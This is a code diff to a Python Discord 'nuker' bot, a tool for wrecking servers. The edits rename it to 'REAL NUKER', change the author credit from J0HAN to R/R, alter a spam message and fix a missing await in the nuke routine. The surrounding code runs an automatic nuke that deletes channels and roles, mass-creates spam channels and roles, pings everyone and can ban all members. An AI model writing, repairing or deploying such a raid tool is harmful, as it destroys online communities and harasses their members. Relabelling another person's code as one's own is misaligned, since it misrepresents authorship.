@@ -1,4 +1,5 @@
-# JOHAN's NUKER | v1.6 | Developed by J0HAN
+
+# JOHANs NUKER | Version 1.6 | Developed by J0HAN
 
 # IMPORTING
 import discord, asyncio, random, time
@@ -506,7 +507,7 @@ async def on_message(message):
     try:
         if msg.startswith(f"{prfx}help"):
             print(f"{dft}\n◄ The help command has been used.")
-            embed=discord.Embed(title="JOHAN NUKER | v1.6", description=f"""**Commands:**
+            embed=discord.Embed(title="REAL NUKER | v1.6", description=f"""**Commands:**
 * {prfx}nuke [y/n] — Automatic nuke that deletes everything, mass channel pings, mass roles, and (optionally) bans everyone
 * {prfx}mcp [amount] [name] [message] — Creates channels and then sends 1-4 messages in them²
 * {prfx}categories [amount] [name] — Creates categories in the amount specified
@@ -531,7 +532,7 @@ async def on_message(message):
 
 Tip: Add '--clean' after a command to turn off logging messages in terminal (doesn't work for commands that have an asterisk after).""", colour=0x336EFF)
             embed.set_author(name=message.author, icon_url=message.author.avatar)
-            embed.set_footer(text="Developed by J0HAN")
+            embed.set_footer(text="Developed by R/R")
             try:
                 await message.reply(embed=embed)
                 print(f"{scs}✚ Help message successfully sent!")
@@ -546,11 +547,11 @@ Tip: Add '--clean' after a command to turn off logging messages in terminal (doe
             loop2=asyncio.get_event_loop()
             loop2.create_task(dc())
             loop2.create_task(dr()) # Note: Discord really doesn't like you creating/deleting a lot of roles quickly
-            await asyncio.gather(mcp(100, "get-nuked", "GET NUKED"), mr(50, "GET NUKED"), de(), ds())
+            await asyncio.gather(mcp(100, "get-nuked", "GET NUKED"), mr(50, "SERVER NUKED"), de(), ds())
             if len(cmdN) > 1:
                 if cmdN[1]=="y":
                     await be()
-            asyncio.wait_for(loop2, timeout=None)
+            await asyncio.wait_for(loop2, timeout=None)
             dbg_on=True
             print(f"{otr}\n► NUKE OVER")
 
